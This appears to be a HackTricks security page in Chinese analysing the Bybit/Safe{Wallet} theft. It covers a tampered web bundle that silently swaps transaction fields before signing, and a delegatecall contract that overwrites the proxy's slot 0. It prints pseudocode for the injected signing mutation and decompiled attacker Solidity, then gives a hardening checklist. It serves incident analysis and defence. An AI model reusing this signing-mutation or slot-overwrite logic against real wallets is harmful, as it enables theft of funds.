# Web3 签名工作流妥协 & Safe Delegatecall Proxy Takeover

{{#include ../../banners/hacktricks-training.md}}

## Overview

一次针对冷钱包的盗窃链结合了 **supply-chain compromise of the Safe{Wallet} web UI** 与 一个 **on-chain delegatecall primitive that overwrote a proxy’s implementation pointer (slot 0)**。关键要点：

- 如果 dApp 能在签名路径中注入代码，就可以让签名者生成一个有效的 **EIP-712 signature over attacker-chosen fields**，同时恢复原始 UI 数据，使其他签名者无法察觉。
- Safe proxies 在 `masterCopy`（implementation）保存于 **storage slot 0**。对一个向 slot 0 写入的合约执行 delegatecall 会有效地将 Safe “升级”成攻击者的逻辑，从而获得对钱包的完全控制。

## Off-chain: Targeted signing mutation in Safe{Wallet}

一个被篡改的 Safe bundle (`_app-*.js`) 有选择性地针对特定的 Safe + 签名者地址。注入的逻辑在签名调用之前立即执行：
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### 攻击属性
- **Context-gated**: 硬编码的允许列表针对受害 Safe/签名者，阻止噪音并降低检测。
- **Last-moment mutation**: 字段（`to`、`data`、`operation`、gas）在 `signTransaction` 之前被立即覆盖，随后恢复，因此 UI 中的提案负载看起来无害，而签名却与攻击者的负载匹配。
- **EIP-712 opacity**: 钱包显示结构化数据，但未解码嵌套的 calldata 或突出显示 `operation = delegatecall`，使得被篡改的消息实际上成为盲签名。

### 网关验证相关性
Safe 提案会提交到 **Safe Client Gateway**。在强化检查之前，如果 UI 在签名后重写字段，网关可能会接受一个 `safeTxHash`/签名与 JSON 正文中的字段不一致的提案。事件发生后，网关现在会拒绝哈希/签名与提交交易不匹配的提案。任何签名编排 API 也应强制执行类似的服务器端哈希验证。

### 2025 年 Bybit/Safe 事件要点
- 2025 年 2 月 21 日 Bybit 冷钱包被抽空（约 401k ETH）复用了相同模式：被入侵的 Safe S3 bundle 仅针对 Bybit 的签名者触发，将 `operation=0` → `1`，并把 `to` 指向一个预部署的攻击者合约，该合约写入 slot 0。
- Wayback 缓存的 `_app-52c9031bfa03da47.js` 显示逻辑以 Bybit 的 Safe（`0x1db9…cf4`）和签名者地址为键，然后在执行两分钟后立即回滚到干净的 bundle，反映了 “mutate → sign → restore” 的伎俩。
- 恶意合约（例如 `0x9622…c7242`）包含简单函数 `sweepETH/sweepERC20`，以及一个写入 implementation slot 的 `transfer(address,uint256)`。执行 `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` 更改了代理实现并授予了完全控制权。

## 链上：通过槽位冲突的 Delegatecall 代理接管

Safe proxies 将 `masterCopy` 保存在 **storage slot 0**，并将所有逻辑委托给它。因为 Safe 支持 **`operation = 1` (delegatecall)**，任何签名的交易都可以指向任意合约，并在代理的存储上下文中执行其代码。

攻击者合约模仿了 ERC-20 的 `transfer(address,uint256)`，但改为将 `_to` 写入 slot 0：
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:
1. 受害者签署 `execTransaction`，其中 `operation = delegatecall`、`to = attackerContract`、`data = transfer(newImpl, 0)`。
2. Safe masterCopy 对这些参数上的签名进行验证。
3. Proxy 向 `attackerContract` 执行 delegatecall；`transfer` 函数体写入 slot 0。
4. Slot 0（`masterCopy`）现在指向攻击者控制的逻辑 → **完全接管钱包并清空资金**。

### Guard & 版本说明（事后加固）
- Safes >= v1.3.0 可以安装 **Guard** 来否决 `delegatecall` 或对 `to`/selectors 实施 ACL；Bybit 运行的是 v1.1.1，因此没有 Guard hook。需要升级合约（并重新添加所有者）来获得这个控制平面。

## 检测与加固清单

- **UI 完整性**：固定 JS 资源 / SRI；监控 bundle 差异；将签名 UI 视为信任边界的一部分。
- **签名时校验**：使用支持 **EIP-712 clear-signing** 的硬件钱包；明确展示 `operation` 并解码嵌套 calldata。除非策略允许，否则在 `operation = 1` 时拒绝签名。
- **服务器端哈希校验**：中继提案的网关/服务必须重新计算 `safeTxHash` 并验证签名与提交的字段一致。
- **策略/白名单**：对 `to`、selectors、资产类型制定预检规则，除经审查的流程外禁止 delegatecall。在广播完整签名的交易前要求内部策略服务进行校验。
- **合约设计**：除非绝对必要，避免在 multisig/treasury 钱包中暴露任意 delegatecall。将升级指针放在远离 slot 0 的位置，或用显式的升级逻辑和访问控制来防护。
- **监控**：对来自持有金库资金的钱包的 delegatecall 执行发送告警，以及对将 `operation` 从典型 `call` 模式更改的提案发出告警。

## References

- [AnChain.AI forensic breakdown of the Bybit Safe exploit](https://www.anchain.ai/blog/bybit)
- [Zero Hour Technology analysis of the Safe bundle compromise](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [In-depth technical analysis of the Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
